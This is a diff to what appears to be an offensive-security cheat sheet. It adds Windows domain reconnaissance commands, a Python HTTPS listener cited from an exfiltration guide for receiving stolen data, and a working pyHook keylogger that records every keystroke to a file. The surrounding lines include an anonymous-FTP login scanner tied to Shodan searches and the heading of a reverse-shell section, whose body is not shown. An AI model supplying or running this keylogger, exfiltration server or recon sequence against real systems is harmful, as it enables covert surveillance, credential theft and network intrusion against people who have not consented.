@@ -112,6 +112,8 @@ net statistics
 nltest /dclist
 net group /domain "Domain Admins"
 date
+tzutil /g
+tracert 8.8.8.8
 hostname
 ipconfig
 arp -a
@@ -458,6 +460,19 @@ for comment in reddit.subreddit('hacking+infosec+redteamsec+cybersecurity+netsec
     print(comment.body)
 ```
 
+# Python HTTPS Server:
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import ssl
+
+httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
+httpd.serve_forever()
+```
+
+Source: ```https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration```
+
 # Enumerating Anonymous FTP Logins Using Python:
 
 ```python
@@ -486,6 +501,22 @@ for item in r:
 1. Usage : ```python3 FTPLoginChecker.py ip_addresses.txt```
 2. Note : Use shodan_eye.py to search for FTP servers that have the ```anon``` login enabled.
 3. Search Keyword : ```230 anonymous```
+
+# Python Keylogger:
+
+```python
+import pyHook, pythoncom, logging
+logging.basicConfig(filename='mykeylogger.txt', level=logging.DEBUG, format='%(message)s')
+
+def OnKeyboardEvent(event):
+    logging.log(logging.DEBUG,chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
+```
 
 # Python Reverse Shell:
 
